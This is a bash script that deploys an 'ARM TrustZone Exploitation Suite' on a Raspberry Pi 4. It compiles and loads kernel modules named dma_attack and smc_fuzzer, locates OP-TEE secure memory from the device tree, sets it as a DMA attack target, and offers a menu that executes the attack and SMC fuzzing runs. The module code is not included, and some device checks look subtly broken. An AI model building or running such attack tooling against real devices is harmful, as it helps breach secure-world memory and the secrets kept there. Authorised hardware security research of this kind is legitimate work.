#!/bin/bash
# Master Deployment Script for ARM TrustZone Exploitation Suite
# Single-command deployment on Raspberry Pi 4

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
log_step() { echo -e "${BLUE}[STEP]${NC} $1"; }

# Check if running on Raspberry Pi
check_platform() {
    log_step "Checking platform..."
    
    if [ ! -f "/proc/device-tree/model" ]; then
        log_error "Not running on a device with device tree"
        exit 1
    fi
    
    model=$(cat /proc/device-tree/model)
    if [[ "$model" == *"Raspberry Pi 4"* ]]; then
        log_info "Running on Raspberry Pi 4 ✓"
    else
        log_warn "Running on: $model"
        log_warn "This script is designed for Raspberry Pi 4"
        read -p "Continue anyway? (y/N) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# Check for OP-TEE
check_optee() {
    log_step "Checking for OP-TEE..."
    
    if [ -c "/dev/tee0" ]; then
        log_info "OP-TEE device found: /dev/tee0 ✓"
    else
        log_error "OP-TEE not running. /dev/tee0 not found."
        log_error "Please boot with OP-TEE enabled."
        exit 1
    fi
    
    # Check dmesg for OP-TEE
    if dmesg | grep -i optee > /dev/null 2>&1; then
        log_info "OP-TEE loaded in kernel ✓"
        dmesg | grep -i optee | tail -3
    else
        log_warn "OP-TEE messages not found in dmesg"
    fi
}

# Parse device tree for secure memory
parse_device_tree() {
    log_step "Parsing device tree for OP-TEE memory..."
    
    bash "${SCRIPT_DIR}/parse_device_tree.sh" "${PROJECT_ROOT}/optee_memory_config.sh"
    
    if [ -f "${PROJECT_ROOT}/optee_memory_config.sh" ]; then
        source "${PROJECT_ROOT}/optee_memory_config.sh"
        log_info "OP-TEE Secure Memory: ${OPTEE_SECURE_BASE} - ${OPTEE_SECURE_END}"
        log_info "Size: ${OPTEE_SECURE_SIZE}"
    else
        log_error "Failed to parse device tree"
        exit 1
    fi
}

# Compile kernel modules
compile_modules() {
    log_step "Compiling kernel modules..."
    
    cd "${PROJECT_ROOT}/kernel_modules"
    
    # Native compilation on Pi
    make ARCH=arm64 CROSS_COMPILE= clean
    make ARCH=arm64 CROSS_COMPILE=
    
    if [ ! -f "dma_attack.ko" ] || [ ! -f "smc_fuzzer.ko" ]; then
        log_error "Kernel module compilation failed"
        exit 1
    fi
    
    log_info "Kernel modules compiled ✓"
    cd "${PROJECT_ROOT}"
}

# Load kernel modules
load_modules() {
    log_step "Loading kernel modules..."
    
    cd "${PROJECT_ROOT}/kernel_modules"
    
    # Unload if already loaded
    sudo rmmod smc_fuzzer 2>/dev/null || true
    sudo rmmod dma_attack 2>/dev/null || true
    
    # Load modules
    sudo insmod dma_attack.ko
    if [ $? -eq 0 ]; then
        log_info "dma_attack.ko loaded ✓"
    else
        log_error "Failed to load dma_attack.ko"
        exit 1
    fi
    
    sudo insmod smc_fuzzer.ko
    if [ $? -eq 0 ]; then
        log_info "smc_fuzzer.ko loaded ✓"
    else
        log_error "Failed to load smc_fuzzer.ko"
        sudo rmmod dma_attack
        exit 1
    fi
    
    # Verify
    lsmod | grep -E "dma_attack|smc_fuzzer"
    
    cd "${PROJECT_ROOT}"
}

# Run hardware scanner
run_scanner() {
    log_step "Running hardware scanner..."
    
    cd "${PROJECT_ROOT}"
    
    if [ ! -f "scanners/hardware_scanner" ]; then
        log_info "Compiling hardware scanner..."
        cd scanners
        gcc -o hardware_scanner hardware_scanner.c -Wall
        cd "${PROJECT_ROOT}"
    fi
    
    log_info "Scanning hardware..."
    sudo ./scanners/hardware_scanner | tee hardware_scan_results.txt
    
    log_info "Scan results saved to: hardware_scan_results.txt"
}

# Configure DMA attack
configure_dma_attack() {
    log_step "Configuring DMA attack..."
    
    # Check module status
    if [ ! -c "/proc/dma_attack" ]; then
        log_error "DMA attack module not loaded"
        return 1
    fi
    
    log_info "DMA attack module status:"
    cat /proc/dma_attack
    
    # Auto-scan for OP-TEE memory
    log_info "Auto-scanning for OP-TEE memory via device tree..."
    echo "scan" | sudo tee /proc/dma_attack
    
    # Set target if we have it from config
    if [ -n "$OPTEE_SECURE_BASE" ]; then
        log_info "Setting target address to: $OPTEE_SECURE_BASE"
        echo "target=$OPTEE_SECURE_BASE" | sudo tee /proc/dma_attack
    fi
    
    log_info "DMA attack configured ✓"
}

# Run SMC fuzzer test
test_smc_fuzzer() {
    log_step "Testing SMC fuzzer..."
    
    if [ ! -c "/proc/smc_fuzzer" ]; then
        log_error "SMC fuzzer module not loaded"
        return 1
    fi
    
    log_info "SMC fuzzer status:"
    cat /proc/smc_fuzzer
    
    log_info "Running test of known SMC IDs..."
    echo "test" | sudo tee /proc/smc_fuzzer
    
    log_info "SMC fuzzer test complete ✓"
}

# Interactive menu
interactive_menu() {
    while true; do
        echo ""
        echo "=========================================="
        echo "ARM TrustZone Exploitation Suite"
        echo "=========================================="
        echo "1. Run DMA attack"
        echo "2. Run SMC fuzzing campaign"
        echo "3. View module status"
        echo "4. Collect results"
        echo "5. Unload modules and exit"
        echo "q. Quit without unloading"
        echo "=========================================="
        read -p "Select option: " choice
        
        case $choice in
            1)
                log_info "Executing DMA attack..."
                echo "execute" | sudo tee /proc/dma_attack
                cat /proc/dma_attack
                ;;
            2)
                read -p "Enter number of fuzzing iterations: " iterations
                log_info "Running $iterations fuzzing iterations..."
                echo "fuzz $iterations" | sudo tee /proc/smc_fuzzer
                cat /proc/smc_fuzzer
                ;;
            3)
                echo ""
                echo "=== DMA Attack Module ==="
                cat /proc/dma_attack
                echo ""
                echo "=== SMC Fuzzer Module ==="
                cat /proc/smc_fuzzer
                ;;
            4)
                mkdir -p "${PROJECT_ROOT}/results"
                cat /proc/dma_attack > "${PROJECT_ROOT}/results/dma_status.txt"
                cat /proc/smc_fuzzer > "${PROJECT_ROOT}/results/smc_fuzzer_status.txt"
                dmesg | grep -E "dma_attack|smc_fuzzer" > "${PROJECT_ROOT}/results/kernel_log.txt"
                log_info "Results saved to: ${PROJECT_ROOT}/results/"
                ;;
            5)
                log_info "Unloading modules..."
                sudo rmmod smc_fuzzer || true
                sudo rmmod dma_attack || true
                log_info "Modules unloaded. Exiting."
                exit 0
                ;;
            q|Q)
                log_info "Exiting without unloading modules."
                exit 0
                ;;
            *)
                log_warn "Invalid option"
                ;;
        esac
    done
}

# Print summary
print_summary() {
    echo ""
    echo "=========================================="
    echo "Deployment Complete!"
    echo "=========================================="
    echo ""
    echo "Loaded modules:"
    lsmod | grep -E "dma_attack|smc_fuzzer"
    echo ""
    echo "Module interfaces:"
    echo "  DMA Attack:  /proc/dma_attack"
    echo "  SMC Fuzzer:  /proc/smc_fuzzer"
    echo ""
    echo "Configuration:"
    echo "  OP-TEE Base: ${OPTEE_SECURE_BASE}"
    echo "  OP-TEE Size: ${OPTEE_SECURE_SIZE}"
    echo ""
    echo "Quick commands:"
    echo "  # DMA attack status"
    echo "  cat /proc/dma_attack"
    echo ""
    echo "  # Execute DMA attack"
    echo "  echo 'execute' | sudo tee /proc/dma_attack"
    echo ""
    echo "  # Run 1000 SMC fuzz iterations"
    echo "  echo 'fuzz 1000' | sudo tee /proc/smc_fuzzer"
    echo ""
    echo "  # View fuzzer stats"
    echo "  cat /proc/smc_fuzzer"
    echo ""
}

# Main function
main() {
    echo ""
    echo "=========================================="
    echo "ARM TrustZone Exploitation Suite"
    echo "Automated Deployment for Raspberry Pi 4"
    echo "=========================================="
    echo ""
    
    check_platform
    check_optee
    parse_device_tree
    compile_modules
    load_modules
    run_scanner
    configure_dma_attack
    test_smc_fuzzer
    
    print_summary
    
    # Ask if user wants interactive menu
    read -p "Launch interactive menu? (Y/n) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Nn]$ ]]; then
        interactive_menu
    else
        log_info "Deployment complete. Modules remain loaded."
        log_info "Use 'sudo rmmod smc_fuzzer dma_attack' to unload."
    fi
}

# Handle arguments
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Automated deployment script for ARM TrustZone exploitation suite."
    echo "Must be run on Raspberry Pi 4 with OP-TEE loaded."
    echo ""
    echo "This script will:"
    echo "  1. Check platform and OP-TEE"
    echo "  2. Parse device tree for secure memory"
    echo "  3. Compile kernel modules"
    echo "  4. Load modules"
    echo "  5. Run hardware scanner"
    echo "  6. Configure attacks"
    echo "  7. Launch interactive menu"
    echo ""
    echo "Options:"
    echo "  --help, -h    Show this help"
    echo ""
    exit 0
fi

# Run main
main "$@"
